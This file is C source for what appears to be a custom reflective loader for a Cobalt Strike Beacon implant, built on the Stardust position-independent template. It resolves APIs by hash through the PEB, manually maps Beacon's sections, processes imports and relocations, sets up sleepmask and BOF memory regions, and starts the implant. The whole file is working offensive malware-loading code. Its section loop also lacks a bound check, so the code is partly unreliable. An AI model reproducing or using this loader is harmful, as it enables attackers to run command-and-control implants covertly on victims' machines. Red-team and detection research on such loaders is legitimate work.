#include <Common.h>
#include <Constexpr.h>

FUNC FILE *__cdecl __acrt_iob_funcs(unsigned index)
{
    STARDUST_INSTANCE
    return &(API( __iob_func )()[index]);
}

#define stdin (__acrt_iob_funcs(0))
#define stdout (__acrt_iob_funcs(1))
#define stderr (__acrt_iob_funcs(2))

FUNC BOOL ResolveApis()
{
    STARDUST_INSTANCE

    // Resolve primary DLLs
    MOD( Ntdll ) = LdrModulePeb( H_MODULE_NTDLL );
    MOD( Kernel32 ) = LdrModulePeb( H_MODULE_KERNEL32 );

    // Resolve Load Library
    RESOLVE( LoadLibraryA, Kernel32 );

    // Validate pointers
    if ( !MOD( Ntdll ) || !MOD( Kernel32 ) || !API(LoadLibraryA) )
        return FALSE;

    // Resolve other DLLs
    #define DLL_ENTRY(mod) if ( !( MOD( mod ) = API( LoadLibraryA )( #mod ) ) ) return FALSE;
    DLL_LIST
    #undef DLL_ENTRY

    // Now resolve all other APIs 
    #define API_ENTRY(api, mod) if ( !( RESOLVE( api, mod ) ) ) return FALSE;
    API_LIST
    #undef API_ENTRY

    return TRUE;
}


FUNC VOID Main(
    _In_ PVOID Param
) {
    STARDUST_INSTANCE
    PCUSTOM_DATA            cData               = { 0 };
    PIMAGE_DOS_HEADER       DOS_Beacon          = { 0 };
    PIMAGE_NT_HEADERS       NT_Beacon           = { 0 };
    PVOID                   Message             = { 0 };
    PIMAGE_SECTION_HEADER   pBeaconSH           = { 0 };
    LPVOID                  pImportDir          = { 0 };
    LPVOID                  pRelocDir           = { 0 };
    PVOID                   pProtect            = { 0 };
    SIZE_T                  szProtect           = { 0 };
    ULONG                   oldProtect          = { 0 };
    USER_DATA               userData            = { 0 };
    ALLOCATED_MEMORY        allocatedMemory     = { 0 };

    // Resolve APIs
    if (!ResolveApis())
    {
        return;
    }

    #ifdef DEBUG
    // Setup debug console for processes without a console
    if (API( AllocConsole )())
    {
        HWND cWindows = API( GetConsoleWindow )();
        API( freopen )("CONIN$", "r", stdin);
        API( freopen )("CONOUT$", "w", stderr);
        API( freopen )("CONOUT$", "w", stdout);
        API( ShowWindow )(cWindows, SW_RESTORE);
        API( SetForegroundWindow )(cWindows);
        API( UpdateWindow )(cWindows);
    }
    #endif

    PRINT("In UDRL!");
    // Allocate a CUSTOM_DATA struct to store values in for later
    cData = API( calloc )(1, sizeof(CUSTOM_DATA));
    Instance()->cData = cData;
    PRINT("cData: %p", cData);

    DOS_Beacon = PADD( Instance()->Base.Buffer, Instance()->Base.Length );
    NT_Beacon = PADD( DOS_Beacon, DOS_Beacon->e_lfanew );

    // Store size of Beacon and calculate total stomp size
	cData->szBeacon = NT_Beacon->OptionalHeader.SizeOfImage;
    cData->szStomp = cData->szBeacon + SZ_SLEEPMASK + SZ_BOF;

    // Mark location of where Beacon will be mapped
    cData->pStompBeacon = API( VirtualAlloc )(NULL, cData->szStomp, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Mark location of sleepmask memory
    cData->pStompSleepmask = PADD( cData->pStompBeacon, cData->szBeacon);
    PRINT("pStompSleepmask: %p", cData->pStompSleepmask);

    // Mark location of BOF memory
    cData->pStompBof = PADD( cData->pStompSleepmask, SZ_SLEEPMASK );
    PRINT("pStompBof: %p", cData->pStompBof);

    // Lets grab the address of Beacon's entry point for later
    API( DllMain ) = PADD( cData->pStompBeacon, NT_Beacon->OptionalHeader.AddressOfEntryPoint );

    // Get first section header from Beacon
    pBeaconSH = IMAGE_FIRST_SECTION( NT_Beacon );

    // Iterate over Beacons sections and map them into memory 
    for (INT i = 0; NT_Beacon->FileHeader.NumberOfSections; i++)
    {
        PRINT("Mapping: %s start: %p end: %p", pBeaconSH[i].Name, PADD( cData->pStompBeacon, pBeaconSH[i].VirtualAddress ), PADD( cData->pStompBeacon, pBeaconSH[i].VirtualAddress, pBeaconSH[i].Misc.VirtualSize ) );

        // For Beacon's .text section, calculate offsets + lengths of Beacon exec and RW sections
        if ( API( strcmp )(pBeaconSH[i].Name, ".text") == 0 )
        {
            cData->pStompBeaconExec = PADD( cData->pStompBeacon, pBeaconSH[i].VirtualAddress );
            cData->szBeaconExec = pBeaconSH[i].Misc.VirtualSize;
            cData->pStompBeaconRw = PADD( cData->pStompBeacon, cData->szBeaconExec );
          	cData->szBeaconRw = (SIZE_T) PSUB( cData->pStompSleepmask, PADD( cData->pStompBeacon, cData->szBeaconExec ) );
        }

		// Copy section into memory
        MmCopy(PADD( cData->pStompBeacon, pBeaconSH[i].VirtualAddress ), PADD( DOS_Beacon, pBeaconSH[i].PointerToRawData ), pBeaconSH[i].SizeOfRawData);
    }

    // Process Beacon's IAT
    pImportDir = PADD( cData->pStompBeacon, (&NT_Beacon->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT])->VirtualAddress );
    ResolveIAT(cData->pStompBeacon, pImportDir);

    // Process relocations
    pRelocDir = PADD( cData->pStompBeacon, (&NT_Beacon->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC])->VirtualAddress );
    ProcessRelocations(cData->pStompBeacon, C_PTR( NT_Beacon->OptionalHeader.ImageBase), pRelocDir);

    // Make Beacon's .text section executable
    pProtect = cData->pStompBeaconExec;
    szProtect = cData->szBeaconExec;
    API( NtProtectVirtualMemory )(NtCurrentProcess(), &pProtect, &szProtect, PAGE_EXECUTE_READ, &oldProtect);

    // Set the version (4.12)
    userData.version = COBALT_STRIKE_VERSION; 

    // Store cData pointer in userData.custom
    MmCopy(userData.custom, &cData, sizeof(PVOID));

    // Store pointer to allocatedMemory within userData
    userData.allocatedMemory = &allocatedMemory;

    // Pass info to Beacon about where Sleepmask should be placed/ran from
    allocatedMemory.AllocatedMemoryRegions[0].Purpose = PURPOSE_SLEEPMASK_MEMORY;
    allocatedMemory.AllocatedMemoryRegions[0].AllocationBase = cData->pStompSleepmask;
    allocatedMemory.AllocatedMemoryRegions[0].RegionSize = SZ_SLEEPMASK;
    allocatedMemory.AllocatedMemoryRegions[0].Sections[0].Label = LABEL_BUFFER;
    allocatedMemory.AllocatedMemoryRegions[0].Sections[0].BaseAddress = cData->pStompSleepmask;
    allocatedMemory.AllocatedMemoryRegions[0].Sections[0].VirtualSize = SZ_SLEEPMASK;
    allocatedMemory.AllocatedMemoryRegions[0].Sections[0].CurrentProtect = PAGE_READWRITE;
    
    // Pass info to Beacon about where BOFs should be placed/ran from
    allocatedMemory.AllocatedMemoryRegions[1].Purpose = PURPOSE_BOF_MEMORY;
    allocatedMemory.AllocatedMemoryRegions[1].AllocationBase = cData->pStompBof;
    allocatedMemory.AllocatedMemoryRegions[1].RegionSize = SZ_BOF;
    allocatedMemory.AllocatedMemoryRegions[1].Sections[0].Label = LABEL_BUFFER;
    allocatedMemory.AllocatedMemoryRegions[1].Sections[0].BaseAddress = cData->pStompBof;
    allocatedMemory.AllocatedMemoryRegions[1].Sections[0].VirtualSize = SZ_BOF;
    allocatedMemory.AllocatedMemoryRegions[1].Sections[0].CurrentProtect = PAGE_READWRITE;

    // Send BUD to DllMain of Beacon
    API( DllMain )(0, DLL_BEACON_USER_DATA, &userData);

    // Flush instruction cache as we have modified executable memory
    API( NtFlushInstructionCache )((HANDLE)-1, NULL, 0);

    // Call Beacon entry point with DLL_PROCESS_ATTACH
    API( DllMain )(cData->pStompBeacon, DLL_PROCESS_ATTACH, NULL);

    // Call Beacon entry point with DLL_BEACON_START
    PRINTB("Calling Beacon entry!");
    API( DllMain )(StRipStart(), DLL_BEACON_START, NULL);
}

